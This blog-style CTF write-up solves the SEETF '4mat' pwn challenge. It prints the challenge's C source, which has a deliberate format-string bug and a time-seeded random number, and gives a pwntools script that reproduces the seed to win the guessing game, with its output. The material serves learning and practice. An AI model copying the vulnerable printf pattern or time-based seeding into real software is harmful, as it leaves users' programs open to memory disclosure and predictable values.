---
title: 4mat
date: 2022-09-15 02:06:13
---
<center>

4MAT writeup

</center>

Before we start you need to download the binary : [Binary](https://drive.google.com/file/d/1aEIBERR7cK4nc75delbBU06If4xhW951/view?usp=sharing).

Let's start by running the binary and see what's in there : 

````console 
┌──(ironbyte㉿IronByte)-[/mnt/c/Users/IR0NYTE/Desktop/ctf/distrib]
└─$ ./vuln
Welcome to SEETF!
Please enter your name to register:
IronByte
Welcome: IronByte

Let's get to know each other!
1. Do you know me?
2. Do I know you?
1
Guess my favourite number!
500
Not even close!
Let's get to know each other!
1. Do you know me?
2. Do I know you?
2
Whats your favourite format of CTFs?
String
Same! I love
String
too!
````
We can see him asking us for a name, then he is giving us some options to choose from, 1st option was to guess his favourite number, 2nd was to input something then output it back to you.
Let's take a look at the code: 

````C
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char name[16];
char echo[100];
int number;
int guess;
int set = 0;
char format[64] = {0};


void guess_me(int fav_num){
    printf("Guess my favourite number!\n");
    scanf("%d", &guess);
    if (guess == fav_num){
        printf("Yes! You know me so well!\n");
	    system("cat flag");
        exit(0);
    }
    else {
        printf("Not even close!\n");
    }
       
}


int main() {

mat1:
    printf("Welcome to SEETF!\n");
    printf("Please enter your name to register: %s\n", name);
    read(0, name, 16);

    printf("Welcome: %s\n", name);

    while(1) {
mat2:
        printf("Let's get to know each other!\n");
        printf("1. Do you know me?\n");
        printf("2. Do I know you?\n");

mat3:
        scanf("%d", &number);


        switch (number)
        {
            case 1:
                srand(time(NULL));
                int fav_num = rand() % 1000000;
		        set += 1;
mat4:
                guess_me(fav_num);
                break;

            case 2:
mat5:
                printf("Whats your favourite format of CTFs?\n");
		        read(0, format, 64);
                printf("Same! I love \n");
		        printf(format);
                printf("too!\n");
                break;

            default:
                printf("I print instructions 4 what\n");
		if (set == 1)
mat6:
                    goto mat1;
		else if (set == 2)
		    goto mat2;
		else if (set == 3)
mat7:
                    goto mat3;
		else if (set == 4)
                    goto mat4;
		else if (set == 5)
                    goto mat5;
		else if (set == 6)
                    goto mat6;
		else if (set == 7)
                    goto mat7;
                break;
        }
    }
    return 0;
}
````

The first thing to notice was that there was a guess_me function out of the main function that asks for a guess number, then try to compare it with another number 'fav_num' that was randomly generated then if your guess is right it will cat for you the flag. Anyway, looking more at the code made me notice another thing which is a critical vulnerability in the code. It was the **'printf (format)'**, actually that print is vulnerable to [*the format string vulnerability*](https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) because we are not specifying the format of each variable passed through the **print ()** function, which can let you read/write data from the stack so the first thing that come to my mind was to try to overwrite the value of that **favorite_number** into a number that I know then try to call the *guess_me* function then I noticed that the value of favorite number will be always randomized. Anyway, that idea was not good enough to solve the puzzle,  I took a look at the option number 1 and it comes to me the idea of just handling the 2 lines **srand (time (NULL)); int fav_num = Rand () % 1000000;** by myself which is a **bad seed** , by importing the libc library and calling the *time* and the *srand* functions from there to just give me the same random value that the *srand* is giving, after that just passing that value to the *guess_me* function to get the flag. That idea was much easier to implement than using the format string vulnerability for me.
Here's the exploit that i made :
````python
from pwn import *
from time import time
from ctypes import CDLL

target = process('./distrib/vuln') #You have got to change your own path of the binary.
# target = remote('fun.chall.seetf.sg', 50001)

# Including the libc library.
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

# Getting to the input of the first option.
screen = target.recvuntil(b"register:")
target.sendline(b"Ironbyte")
screen = target.recvuntil(b"you?")
target.sendline(b"1")
screen = target.recvline()

# Passing down the current time and generating the Right Number.
libc.srand(int(time()))
generated_Number = libc.rand() % 1000000  
target.sendline(str(generated_Number).encode()) 

# Gdb.attach(target, gdbscript='b* 00400668')

target.interactive()
target.close()
```` 

````console
┌──(ironbyte㉿IronByte)-[/mnt/c/Users/IR0NYTE/Desktop/ctf]
└─$ python3 exploit.py
[+] Starting local process './distrib/vuln': pid 607
[*] Switching to interactive mode
Guess my favourite number!
Yes! You know me so well!
cat: flag: No such file or directory
[*] Got EOF while reading in interactive
$
````
feel free to add your own flag if you are testing locally cuz i'm too lazy to add one :).


